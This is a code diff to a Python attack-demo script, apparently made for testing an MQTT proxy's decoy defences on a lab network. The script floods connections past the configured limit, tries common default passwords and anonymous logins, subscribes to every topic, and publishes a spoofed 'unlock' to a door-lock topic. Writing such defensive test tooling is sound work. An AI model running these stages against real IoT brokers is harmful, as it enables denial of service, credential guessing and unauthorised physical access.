@@ -12,7 +12,7 @@ from pathlib import Path
 ROOT = Path(__file__).resolve().parents[1]
 if str(ROOT) not in sys.path:
     sys.path.insert(0, str(ROOT))
-from pi.config import integer, load_config
+from pi.config import addresses, integer, load_config
 
 
 def mqtt_length(size: int) -> bytes:
@@ -57,12 +57,8 @@ def publish_packet(topic: str, payload: str) -> bytes:
 
 
 def open_socket(host: str, port: int, source_ip: str | None) -> socket.socket:
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(2)
-    if source_ip:
-        sock.bind((source_ip, 0))
-    sock.connect((host, port))
-    return sock
+    return socket.create_connection((host, port), timeout=5,
+                                    source_address=(source_ip, 0) if source_ip else None)
 
 
 def reconnect(host: str, port: int, source_ip: str | None,
@@ -70,16 +66,24 @@ def reconnect(host: str, port: int, source_ip: str | None,
     """Keep reconnecting because the proxy deliberately ejects high-risk clients."""
     last_error: OSError | None = None
     for attempt in range(1, attempts + 1):
+        sock = None
         try:
             sock = open_socket(host, port, source_ip)
             sock.sendall(packet)
-            reply = sock.recv(4)
-            if len(reply) >= 4 and reply[0] == 0x20:
+            reply = bytearray()
+            while len(reply) < 4:
+                chunk = sock.recv(4 - len(reply))
+                if not chunk:
+                    break
+                reply.extend(chunk)
+            if len(reply) == 4 and reply[:2] == b"\x20\x02":
                 print(f"  reconnect {attempt}: CONNACK={reply[3]}")
                 return sock
             sock.close()
         except OSError as exc:
             last_error = exc
+            if sock is not None:
+                sock.close()
         time.sleep(0.2)
     raise RuntimeError(f"could not reconnect after {attempts} attempts: {last_error}")
 
@@ -90,35 +94,46 @@ def main() -> None:
     args = parser.parse_args()
     config = load_config()
     host, port = config["PI_IP"], integer(config, "PROXY_PORT")
+    if config.get("TLS_CERT_PATH"):
+        parser.error("This combined demo uses plaintext MQTT; use individual scenarios for TLS.")
+    source = args.source_ip
+    if source is None and host in {"127.0.0.1", "localhost"}:
+        from attacker.demo import fresh_loopback_source
+        source, _ = fresh_loopback_source(f"http://{host}:{config['DASH_PORT']}", "127.0.0.20", config)
+    if source in addresses(config, "WHITELIST_IPS"):
+        parser.error("The attack source is whitelisted; use the testing laptop's non-whitelisted address.")
     print("=" * 72)
+    print(f"Attack source: {source or 'LAN address selected by the OS'}; target={host}:{port}")
     print("AUTHORIZED TEST NETWORK ONLY - do not run against systems you do not own")
     print("=" * 72)
 
     print("Stage 1/4: connection-rate flood")
     sockets: list[socket.socket] = []
-    for _ in range(integer(config, "CONNECTION_LIMIT") + 1):
-        sockets.append(open_socket(host, port, args.source_ip))
-    for sock in sockets:
-        sock.close()
+    try:
+        for _ in range(integer(config, "CONNECTION_LIMIT") + 1):
+            sockets.append(open_socket(host, port, source))
+    finally:
+        for sock in sockets:
+            sock.close()
     time.sleep(0.5)
 
     print("Stage 2/4: wrong-password and anonymous authentication attempts")
     attempts = [("admin", value) for value in ("admin", "password", "123456", "letmein", "iot")]
     attempts.append((None, None))
     for index, (username, password) in enumerate(attempts):
-        sock = reconnect(host, port, args.source_ip,
+        sock = reconnect(host, port, source,
                          connect_packet(f"auth-{index}", username, password))
         sock.close()
         time.sleep(0.1)
 
     print("Stage 3/4: reconnect and subscribe to # (now inside the decoy)")
-    sock = reconnect(host, port, args.source_ip, connect_packet("recon-stage"))
+    sock = reconnect(host, port, source, connect_packet("recon-stage"))
     sock.sendall(subscribe_packet("#"))
     time.sleep(0.5)
     sock.close()
 
     print("Stage 4/4: reconnect and publish unlock inside the decoy")
-    sock = reconnect(host, port, args.source_ip, connect_packet("spoof-stage"))
+    sock = reconnect(host, port, source, connect_packet("spoof-stage"))
     sock.sendall(publish_packet("home/door/lock", "unlock"))
     time.sleep(0.5)
     sock.close()
